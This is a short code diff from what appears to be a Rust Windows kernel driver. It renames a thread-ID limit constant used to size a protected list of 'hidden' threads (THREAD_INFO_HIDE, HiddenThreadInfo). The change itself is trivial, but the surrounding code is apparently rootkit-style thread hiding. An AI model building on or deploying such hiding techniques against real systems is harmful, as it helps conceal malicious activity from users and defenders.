@@ -9,7 +9,7 @@ use {
             HiddenThreadInfo, TargetThread, LIST_ENTRY, 
             ThreadListInfo, EnumerateInfoInput
         }, 
-        vars::MAX_TIDS,
+        vars::MAX_TID,
         enums::Options,
     }, 
     wdk_sys::{
@@ -26,7 +26,7 @@ pub mod ioctls;
 pub use callback::*;
 
 /// List of target threads protected by a mutex.
-pub static THREAD_INFO_HIDE: Lazy<Mutex<Vec<HiddenThreadInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TIDS))); 
+pub static THREAD_INFO_HIDE: Lazy<Mutex<Vec<HiddenThreadInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID))); 
 
 /// Represents a thread in the operating system.
 pub struct Thread {
